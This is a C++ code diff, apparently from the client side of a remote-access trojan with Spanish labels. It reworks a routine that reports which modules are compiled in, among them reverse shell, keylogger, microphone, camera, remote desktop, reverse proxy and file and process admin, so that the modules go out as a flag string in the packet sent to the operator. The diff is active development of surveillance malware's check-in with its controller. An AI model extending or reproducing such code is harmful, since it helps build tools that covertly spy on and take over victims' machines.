@@ -35,88 +35,66 @@ void Cliente::Init_Key() {
 }
 
 void Cliente::CheckMyMods() {
-    std::cout << "CAM: "
-#ifdef __MOD_CAM
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
+    memset(this->mods, '0', 13);
+    this->mods[12] = '\0';
 
-    std::cout << "NET SCAN: "
-#ifdef __MOD_SCAN
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "ADMIN ARCHIVOS: "
-#ifdef __MOD_FM
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "FUN: "
-#ifdef __MOD_F
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "INFO: "
-#ifdef __MOD_INFO
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-    
-    std::cout << "KEYLOGGER: "
-#ifdef __MOD_KEY
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "MICROFONO: "
-#ifdef __MOD_MIC
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "ESCRITORIO REMOTO: "
-#ifdef __MOD_RD
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "PROXY INVERSA: "
-#ifdef __MOD_RP
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "ADMIN VENTANAS: "
-#ifdef __MOD_WM
-        << "SI\n";
-#else
-        << "NO\n";
-#endif
-
-    std::cout << "REVERSE SHELL: "
+    //"REVERSE SHELL: "
 #ifdef __MOD_SHELL
-        << "SI\n";
-#else
-        << "NO\n";
+        this->mods[0] = '1';
 #endif
 
-    std::cout << "ADMIN PROCESOS: "
+        //"MICROFONO: "
+#ifdef __MOD_MIC
+        this->mods[1] = '1';
+#endif
+
+       //"KEYLOGGER: "
+#ifdef __MOD_KEY
+        this->mods[2] = '1';
+#endif
+
+       //"CAM: "
+#ifdef __MOD_CAM
+        this->mods[3] = '1';
+#endif
+
+       // "ESCRITORIO REMOTO: "
+#ifdef __MOD_RD
+        this->mods[4] = '1';
+#endif
+
+        //ADMIN VENTANAS: "
+#ifdef __MOD_WM
+        this->mods[5] = '1';
+#endif
+
+        //"INFO: "
+#ifdef __MOD_INFO
+        this->mods[6] = '1';
+#endif
+
+        //"NET SCAN: "
+#ifdef __MOD_SCAN
+        this->mods[7] = '1';
+#endif
+
+        //"FUN: "
+#ifdef __MOD_F
+        this->mods[8] = '1';
+#endif
+
+        //"ADMIN ARCHIVOS: "
+#ifdef __MOD_FM
+        this->mods[9] = '1';
+#endif
+
+        //"PROXY INVERSA: "
+#ifdef __MOD_RP
+        this->mods[10] = '1';
+#endif
+
 #ifdef __MOD_PM
-        << "SI\n";
-#else
-        << "NO\n";
+        this->mods[11] = '1';
 #endif
 
 }
@@ -1419,6 +1397,11 @@ void Cliente::iniPacket() {
     strIPS = strIPS.substr(0, strIPS.length() - 7);
 
     strOut += strIPS;
+    strOut.append(1, CMD_DEL);
+
+    this->CheckMyMods();
+
+    strOut.append(this->mods);
 
     _DBG_(strOut, 0);
     
